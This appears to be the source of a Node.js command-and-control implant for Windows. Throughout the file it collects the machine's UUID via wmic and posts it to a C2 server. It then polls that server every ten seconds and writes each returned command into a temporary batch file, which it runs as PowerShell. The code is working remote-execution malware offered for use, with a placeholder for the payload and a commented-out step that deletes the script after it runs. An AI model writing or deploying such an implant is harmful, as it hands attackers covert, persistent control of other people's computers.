// some variables
var website_ip = "http://127.0.0.1:8000" // command and control server ip and port
var payload = ["[INSERT PAYLOAD]"] // placeholder
// imports
const axios = require('axios'); // you might need to install it --> npm install axios
const fs = require('fs');
const os = require("os");
const { spawn } = require( 'child_process' );
// get uuid of machine 
const uuid = spawn( 'cmd', [ '/c', 'wmic', "path", "win32_computersystemproduct", "get", "uuid" ] );
// write exec_script.bat to temp as a placeholder
fs.writeFileSync(os.tmpdir()+'\\exec_script.bat', "");

// read the uuid
uuid.stdout.on( 'data', ( data ) => parseUUID( `stdout: ${ data }` ) );
uuid.on('close', ( code ) => console.log( `child process exited with code ${code}` ))

// parse the uuid
function parseUUID(uuid){
    sendUUID(uuid.toString().split("\n")[1].replaceAll("\r", "").replaceAll(" ", "")) // beautifies the uuid and removes all the other junk
}

// send uuid to the command and control server
function sendUUID(uuid){
    const data = {
        uuid: uuid
    };
    axios.post(website_ip, data)
}


// GET command and control server's command
function logEvery2Seconds(i) { // [UPDATE] changed from 2 seconds to 10 seconds
    setTimeout(() => {
        axios.get(website_ip+'/backend/')
            .then(function (response) {
                // if command already in executed payloads
                if(payload[0] == response.data){
                    console.log("Payload already executed!")

                } else { // if it isnt
                    payload.pop() // remove the already executed payload
                    payload.push(response.data) // add the current payload
                    // console.log(response.data)
                    fs.writeFileSync(os.tmpdir()+'\\exec_script.bat', "powershell.exe -command "+response.data); // write the payload to %temp%\exec_script.bat
                    spawn('cmd.exe', ["/c", "%temp%\\exec_script.bat"]) // execute the payload written into %temp%\exec_script.bat
                    /*
                    setInterval(() => {
                        spawn('cmd.exe', ["/c", "del", "/f", "%temp%\\exec_script.bat"]) // delete script after 1.5 secs
                    }, 1500)
                    */

                    
                }
                
        })
        console.log('Check /backend/ for command');
        logEvery2Seconds(++i); // calls itself again (infinite loop )
    }, 10000)
}

logEvery2Seconds(0);

let i = 0;
setInterval(() => {
    console.log('Infinite Loop Test interval n:', i++); // tells how much logEvery2Seconds() was executed
}, 10000)
